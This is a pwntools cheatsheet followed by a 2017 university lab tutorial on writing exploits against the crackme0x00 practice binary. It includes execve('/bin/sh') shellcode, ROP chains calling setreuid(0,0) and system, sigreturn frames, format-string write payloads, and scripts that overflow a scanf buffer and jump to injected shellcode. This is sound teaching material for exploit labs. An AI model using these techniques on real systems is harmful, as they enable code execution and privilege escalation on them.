# Pwntools Cheatsheet

##
#
https://gist.githubusercontent.com/anvbis/64907e4f90974c4bdd930baeb705dedf/raw/8b3d00bfd9be467eecb81adcfd886ca41de9be4a/pwntools-cheatsheet.md
#
##

 1. [Program Interaction](#program-interaction)
 2. [Environment and Contexts](#environment-and-contexts)
 3. [Logging and Output](#logging-and-output)
 4. [Encoding, Packing and Utility](#encoding-packing-and-utility)
 5. [Assembly and Shellcraft](#assembly-and-shellcraft)
 6. [ELFs, Strings and Symbols](#elfs-strings-and-symbols)
 7. [Return Oriented Programming](#return-oriented-programming)
 8. [SROP and Sigreturn Frames](#srop-and-sigreturn-frames)
 9. [Format String Exploits](#format-string-exploits)


<a name="program-interaction"></a>
## 1. Program Interaction

```py
# process objects can be created from a local binary, or created
# from a remote socket
p = process('./target')
p = remote('127.0.0.1', 1337)
```

```py
# environment variables and command line arguments can also be passed
# to the target binary at runtime
p = process(['./target', '--arg1', 'some data'], env={'env1': 'some data'})
```

```py
# you can attach a gdb instance to your already running process
p = process('./target')
gdb.attach(p)

# you can also start the process running under gdb, disable ASLR,
# and send gdb script at startup
p = gdb.debug('./target', aslr=False, gdbscript='b *main+123')
```

```py
# writing data to the process `stdin`
p.write(b'aaaa')      # p.send(b'aaaa')
p.writeline(b'aaaa')  # p.sendline(b'aaaa'), p.write(b'aaaa' + b'\n')

# reading data from the process `stdout`
p.read(123)                 # p.recv(123)
p.readline()                # p.recvline(), p.readuntil('\n')
p.readuntil('some string')  # p.recvuntil('some string')
p.readall()                 # p.recvall()
p.clean(1)                  # like `readall` but with a timeout

# p.readuntil('some string') ; p.write(b'aaaa')
p.writeafter('some string', b'aaaa')  # p.sendafter('some string', b'aaaa')

# p.readuntil('some string') ; p.writeline(b'aaaa')
p.writelineafter('some string', b'aaaa')  # p.sendlineafter('some string', b'aaaa')

# interacting with the process manually
p.interactive()

# waiting for the process to finish
p.wait()
```

```py
# you can also use pwntools tubes in python's `with` specifier
with process('./target') as p:
    # interact with process here, when done `p.close()` is called
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="environment-and-contexts"></a>
## 2. Environment and Contexts

```py
# this list of context values is not exhaustive, these are
# just the ones that I use the most often

# target architecture (default 'i386')
# valid values are 'aarch64', 'arm', 'i386', and 'amd64'
# note that this is very important when writing assembly,
# packing integers, and when building rop chains
context.arch = 'amd64'

# endianness (default 'little')
# valid values are 'big', and 'little'
context.endian = 'big'

# log verbosity (default 'info')
# valid values are 'debug', 'info', 'warn', and 'error'
context.log_level = 'error'

# signedness (default 'unsigned')
# valid values are 'unsigned', and 'signed'
context.sign = 'signed'
```

```py
# you can also update multiple context values at once with the 
# `clear` or `update` functions
context.clear(arch='amd64', log_level='error')
context.update(arch='amd64', log_level='error')
```

```py
# pwntools also allows you to use what are called 'scoped'
# contexts, utilising python's `with` specifier
with context.local(log_level='error'):
    # do stuff
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="logging-and-output"></a>
## 3. Logging and Output

```py
# the most basic logging utilities are below
log.warn('a warning message')     # -> [!] a warning message
log.info('some information')      # -> [*] some information
log.debug('a debugging message')  # -> [DEBUG] a debugging message
```

```py
# logging errors will trigger an exception in addition
# to printing some output
log.error('an error occurred')

'''
[ERROR] an error occurred
---------------------------------------------------------------------------
PwnlibException                           Traceback (most recent call last)
<ipython-input-10-5fe862ad5f5b> in <module>
----> 1 log.error('an error occurred')

/usr/local/lib/python3.9/dist-packages/pwnlib/log.py in error(self, message, *args, **kwargs)
    422         """
    423         self._log(logging.ERROR, message, args, kwargs, 'error')
--> 424         raise PwnlibException(message % args)
    425 
    426     def exception(self, message, *args, **kwargs):

PwnlibException: an error occurred
'''
```

```py
# debug messages work a little differently than the
# other log levels, by default they're disabled
context.log_level = 'debug'

# they will also trigger on a lot of normal functions
# if the log level is set to debug
asm('nop')

'''
[DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.9/dist-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    nop
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-gl2k0o4t/step2 /tmp/pwn-asm-gl2k0o4t/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-gl2k0o4t/step3 /tmp/pwn-asm-gl2k0o4t/step4
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="encoding-packing-and-utility"></a>
## 4. Encoding, Packing and Utility

```py
# pwntools provides functions for converting to / from
# hexadecimal representations of byte strings
enhex(b'/flag')      # = '2f666c6167'
unhex('2f666c6167')  # = b'/flag'

# pwntools provides functions for converting to / from
# base64 representations of byte strings
b64e(b'/flag')    # = 'L2ZsYWc='
b64d('L2ZsYWc=')  # = b'/flag'
```

```py
# you can also find functions for calculating md5 and sha1
# hashes within the pwntools library
md5sumhex(b'hello')         # = '5d41402abc4b2a76b9719d911017c592'
md5filehex('./some-file')   # = '2b00042f7481c7b056c4b410d28f33cf'
sha1sumhex(b'hello')        # = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d'
sha1filehex('./some-file')  # = '7d97e98f8af710c7e7fe703abc8f639e0ee507c4'
```

```py
# converting from integer representations
p8(0x41)                 # = b'\x41'
p16(0x4142)              # = b'\x42\x41'
p32(0x41424344)          # = b'\x44\x43\x42\x41'
p64(0x4142434445464748)  # = b'\x48\x47\x46\x45\x44\x43\x42\x41'

# converting to integer representations
u8(b'\x41')                               # = 0x41
u16(b'\x42\x41')                          # = 0x4142
u32(b'\x44\x43\x42\x41')                  # = 0x41424344
u64(b'\x48\x47\x46\x45\x44\x43\x42\x41')  # = 0x4142434445464748
```

```py
# you can also specify endianness with the (un)packing functions
p64(0x4142434445464748, endian='big')                   # = b'\x41\x42\x43\x44\x45\x46\x47\x48
u64(b'\x41\x42\x43\x44\x45\x46\x47\x48', endian='big')  # = 0x4142434445464748
```

```py
# pwntools also provides a `pack` and `unpack` functions for data of
# atypical or unusual length
pack(0x414243, 24)           # = b'\x43\x42\x41'
unpack(b'\x41\x42\x43', 24)  # = 0x434241
```

```py
# a leak we've captured from the process `stdout`
leak = b'0\xe1u65\x7f'

# we can use pwntools' `unpack` function to convert it to
# an integer representation
leak = unpack(leak, 'all')  # leak = 139866523689264 = 0x7f353675e130
```

```py
# pwntools also provides functions for generating cyclic sequences
# of bytes to find various offsets in memory
cyclic(16)       # = b'aaaabaaacaaadaaa'
cyclic(16, n=8)  # = b'aaaaaaaabaaaaaaa'

cyclic_find(0x61616164)               # = 12
cyclic_find(0x6161616161616162, n=8)  # = 8
```

```py
# you can also print hexdumps of byte strings
print(hexdump(data))

'''
00000000  65 4c b6 62  da 4f 1d 1b  d8 44 a6 59  a3 e8 69 2c  │eL·b│·O··│·D·Y│··i,│
00000010  09 d8 1c f2  9b 4a 9e 94  14 2b 55 7c  4e a8 52 a5  │····│·J··│·+U|│N·R·│
00000020
'''
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="assembly-and-shellcraft"></a>
## 5. Assembly and Shellcraft

The shellcraft module is massive, so maybe just [read the documentation](https://pwntools.readthedocs.io/en/latest/shellcraft.html).

```py
# you can write shellcode using the `asm` function
shellcode = asm('''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
''')

# assembly needs to be converted into bytes in order
# to be sent as part of a payload
payload = bytes(shellcode)
```

```py
# here's some assembly for a basic `execve("/bin/sh")` shellcode
shellcode = asm('''
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, SYS_execve
syscall
''')

# another way to represent this would be to use pwntools' shellcraft
# module, of which there are so many ways to do so
shellcode = shellcraft.pushstr('/bin/sh')
shellcode += shellcraft.syscall('SYS_execve', 'rsp', 0, 0)

payload = bytes(asm(shellcode))
```

```py
# or maybe you can just use pwntools' `sh` template
shellcode = shellcraft.sh()
payload = bytes(asm(shellcode))
```

```py
# you can also use gdb to debug shellcode
shellcode = '''
execve:
    lea rdi, [rip+bin_sh]
    mov rsi, 0
    mov rdx, 0
    mov rax, SYS_execve
    syscall
bin_sh:
    .string "/bin/sh"
'''

# converting the shellcode we wrote to an elf
elf = ELF.from_assembly(shellcode)
p = gdb.debug(elf.path)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="elfs-strings-and-symbols"></a>
## 6. ELFs, Strings and Symbols

```py
# `ELF` objects are instantiated by providing a file name
elf = ELF('./target')
```

```py
# accessing symbols via location
elf.plt  # contains all symbols located in the PLT
elf.got  # contains all symbols located in the GOT

# elf.sym contains all known symbols, with preference
# given to the PLT over the GOT
elf.sym

# e.g. getting the address of the `puts` function
puts = elf.plt.puts  # equivalent to elf.sym['puts']
```

```py
libc = ELF('./libc.so.6')

old_puts = libc.sym.puts  # = 0x875a0

# you can modify the base address of the elf by setting its
# address parameter
libc.address = 0xdeadbeef000

# symbol locations will now be calculated relative to that
# base address provided
new_puts = libc.sym.puts  # 0xdeadbf765a0 = 0xdeadbeef + 0x875a0
```

```py
libc = ELF('./libc.so.6')

# you can even find strings in elf files with the `search` function
bin_sh = next(elf.search(b'/bin/sh'))
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="return-oriented-programming"></a>
## 7. Return Oriented Programming

```py
# `ROP` objects are instantiated using an `ELF` object
elf = ELF('./target')
rop = ROP(elf)
```

```py
# specific gadgets can be found using the `find_gadget` function
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
syscall = rop.find_gadget(['syscall', 'ret']).address

# another alternative for simple `pop reg; ret` gadgets
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
```

```py
pop_rax = 0xdeadbeef
syscall = 0xcafebabe

# the below is equivalent to `p64(pop_rax) + p64(59) + p64(syscall)`,
# when converted to bytes
rop.raw(pop_rax)
rop.raw(59)
rop.raw(syscall)
```

```py
rop.call(elf.sym.puts, [0xdeadbeef])

# the above `call` function is equivalent to
rop.raw(rop.rdi.address)  # pop rdi; ret
rop.raw(0xdeadbeef)
rop.raw(elf.sym.puts)
```

```py
# rop chains can also be built on top of libc, rather than your
# target binary
libc = ELF('./libc.so.6')
libc.address = 0xdeadbeef  # setting the base address of libc

bin_sh = next(libc.search(b'/bin/sh'))

# note that this rop chain will use gadgets found in libc
rop = ROP(libc)

# you can also directly call elf symbols (if they're available in) 
# the elf) instead of using pwntools' `call` function
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
```

```py
# converting the rop chain to bytes in order to send it as
# a payload
payload = rop.chain()
```

```py
# printing the rop chain generated by pwn tools
print(rop.dump())
```

[^ Back to top](#file-pwntools-cheatsheet-md)

<a name="srop-and-sigreturn-frames"></a>
## 8. SROP and Sigreturn Frames

```py
# address of a syscall instruction
syscall = 0xdeadbeef

# address of a "/bin/sh" string
bin_sh = 0xcafebabe

# instatiating a sigreturn frame object
frame = SigreturnFrame()

# setting values of registers (set rip as address to return to)
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
```

```py
# the sigreturn frame will need to be converted to bytes prior
# to being sent as part of a payload
payload = bytes(frame)
```

[^ Back to top](#file-pwntools-cheatsheet-md)


<a name="format-string-exploits"></a>
## 9. Format String Exploits

```py
# the format string offset
offset = 5

# the writes you want to perform
writes = {
    0x40010: 0xdeadbeef,  # write 0xdeadbeef at 0x40010
    0x40018: 0xcafebabe   # write 0xcafebabe at 0x40018
}

# you can use the `fmtstr_payload` function to automatically
# generate a payload that performs the writes you specify
payload = fmtstr_payload(offset, writes)
p.writeline(payload)
```

```py
# if data is written by the vulnerable function at the start of
# your payload, you can specify the number of bytes written
payload = fmtstr_payload(offset, writes, numbwritten=8)
p.writeline(payload)
```

```py
p = process('./target')

# you will need to define a function that sends your payload to
# the target, and returns the value output by the target
def send_data(payload):
    p.sendline(payload)
    return p.readall()

# automatic calculation of the format string offset
fmt_str = FmtStr(execute_fmt=send_data)
offset = fmt_str.offset
```

```py
# you can also use the `FmtStr` object to perform your writes
fmt_str = FmtStr(execute_fmt=send_data)
fmt_str.write(0x40010, 0xdeadbeef)  # write 0xdeadbeef at 0x40010
fmt_str.write(0x40018, 0xcafebabe)  # write 0xcafebabe at 0x40018
fmt_str.execute_writes()
```

[^ Back to top](#file-pwntools-cheatsheet-md)


##
##

Source: https://tc.gts3.org/cs6265/2017/l/lab04/README-tut.txt

====================================
Lec04: Writing Exploits with PwnTool
====================================


  http://docs.pwntools.com/
  http://docs.pwntools.com/en/stable/intro.html


Do you remember the first crackme binary (and its password)?

  $ cd tut/lab04
  $ cp ../lab01/IOLI-crackme/crackme0x00 .

If you disassembled the binary, you might see these code snippet:

  $ objdump -d crackme0x00
  ... 
  8048448:       8d 45 e8                lea    -0x18(%ebp),%eax
  804844b:       89 44 24 04             mov    %eax,0x4(%esp)
  804844f:       c7 04 24 8c 85 04 08    movl   $0x804858c,(%esp)
  8048456:       e8 d5 fe ff ff          call   8048330 <scanf@plt>
  ...

And its source code simply looks like:

  main() {
    char s1[16];
    ...
    scanf("%s", &s1);
    ...
  }

By injecting a long enough input, we could hijack its control flow
in the last tutorial, like this:

    $ echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ > input
    $ ./crackme0x00 < input
    $ dmesg | tail -1
    [238584.915883] crackme0x00[1095]: segfault at 48484848 ip 0000000048484848 sp 00000000ffffd6a0 error 14


1. Learning PwnTool
===================

In fact, PwnTool provides a convenient way to create such an input,
what is commonly known as a "cyclic" input.

    $ cyclic 50
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Given a four bytes in a sequence, we can easily locate the position
at the input string.

    $ cyclic 50 | ./crackme0x00
    $ dmesg | tail
    [24728.073646] crackme0x00[15085]: segfault at 61616168 ip 0000000061616168 sp 00000000ffffd6a0 error 14

    $ cyclic -l 0x61616168
    28

    $ cyclic --help
    ...

Let's write a python script by using pwntools.

------------------------------------------------------------
exploit1.py
------------------------------------------------------------
#!/usr/bin/env python2

# import all modules/commands from pwn library
from pwn import *

# set the context of the target platform
#  arch: i386 (x86 32bit)
#  os: linux
context.update(arch='i386', os='linux')

# create a process
p = process("./crackme0x00")

# send input to the program with a newline char, "\n"
#  cyclic(50) provides a cyclic string with 50 chars
p.sendline(cyclic(50))

# make the process interactive, so you can interact
# with the proces via its terminal
p.interactive()
------------------------------------------------------------

[Task 1] Hijack its control flow to 0xdeadbeef by using

   cyclic_find()
   p32()


2. Exploiting crackme0x00
=========================

Our plan is to invoke a shell by hijacking this control flow. Before
doing this, let's check what kinds of security mechanisms are applied
to that binary.

  $ checksec ./crackme0x00 
  [*] '/home/users/taesoo/tut/lab04/crackme0x00'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x8048000)

Do you see "NX enabled", which means that its memory space such as stack
is not executable (W^X). We will study how to bypass this defense next
week, so let's disable this defense.

  $ execstack -s crackme0x00
  $ checksec ./crackme0x00 
  [*] '/home/users/taesoo/tut/lab04/crackme0x00'
      Arch:     i386-32-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX disabled
      PIE:      No PIE (0x8048000)
      RWX:      Has RWX segments

Our plan is to hijack its ra and jump to a shellcode.

             |<-- -0x18-->|+--- ebp 
  top                     v
  [          [       ]   ][fp][ra][shellcode ... ]
  |<----   0x28  ------->|     |  ^
                               |  |
                               +---

PwnTool also provides numerous ready-to-use shellcode as well.

  $ shellcraft -l
  ...
  i386.android.connect
  i386.linux.sh
  ...

  $ shellcraft -f a i386.linux.sh
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

shellcraft provides more than just this; a debugging interface (-d)
and a test run (-r), so please check: `shellcraft --help`

  $ shellcraft -d i386.linux.sh
  $ shellcraft -r i386.linux.sh

------------------------------------------------------------
exploit2.py
------------------------------------------------------------
#!/usr/bin/env python2

from pwn import *

context.update(arch='i386', os='linux')

shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))

payload  = cyclic(cyclic_find(0x61616168))
payload += p32(0xdeadbeef)
payload += asm(shellcode)

p = process("./crackme0x00")
p.sendline(payload)
p.interactive()
------------------------------------------------------------

  *asm() compiles your shellcode and provides its binary string.

[Task 2] Where it should jump (i.e., where does the shellcode locate)?
 change 0xdeadbeef to the shellcode region.

Does it work? In fact, it shouldn't, but how to debug/understand this
situation?


3. Debugging Exploits
=====================

Gdb module (http://docs.pwntools.com/en/stable/gdb.html) provides a
convenient way to program your debugging script.

To display debugging information, you need to use terminal 
that can split your shell into multiple screens. Since pwntools 
supports "tmux" you can use the gdb module through tmux terminal.

$ tmux
$ ./exploit3.py

------------------------------------------------------------
exploit3.py
------------------------------------------------------------
#!/usr/bin/env python2

from pwn import *

context.update(arch='i386', os='linux')

print(shellcraft.sh())
print(hexdump(asm(shellcraft.sh())))

shellcode = shellcraft.sh()

payload  = cyclic(cyclic_find(0x61616168))
payload += p32(0xdeadbeef)
payload += asm(shellcode)

p = gdb.debug("./crackme0x00", '''
echo "hi"
# break *0xdeadbeef
continue
''')
p.sendline(payload)
p.interactive()
------------------------------------------------------------

 *0xdeadbeef should points to the shellcode.

The only difference is that "process()" is replaced with "gdb.debug()"
and the second argument, as you guess, is the gdb script that you'd
like to execute (e.g., setting break points).

[Task 3] Where is this exploit stuck? (This may be different in your setting)

     ...
     0xffffc365:  xor    edx,edx
     0xffffc367:  push   0x0
     0xffffc369:  pop    esi
  => 0xffffc36a:  div    edi
     0xffffc36c:  add    BYTE PTR [eax],al
     0xffffc36e:  add    BYTE PTR [eax],al

The shellcode is not properly injected. Could you spot the differences
between the above shellcode (shellcraft -f a i386.linux.sh) and what
is injected?

    ...
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80


3. Bypassing scanf()
====================

  $ man scanf

scanf() accepting all non-white-space chars (including the NULL char!)
but the default shellcode from pwntool contain white-space char (0xb),
which chopped our shellcode at the end.

These are white-space chars that scanf():

  09, 0a, 0b, 0c, 0d, 20

If you are curious, check:

   $ cd scanf
   $ make
   ...

[Task 4] Can we change your shellcode without using these chars?
Please use exploit4.py.

In fact, pwntool has more features than ones introduced in this
simple tutorial. Please check its online manual:

  http://docs.pwntools.com/
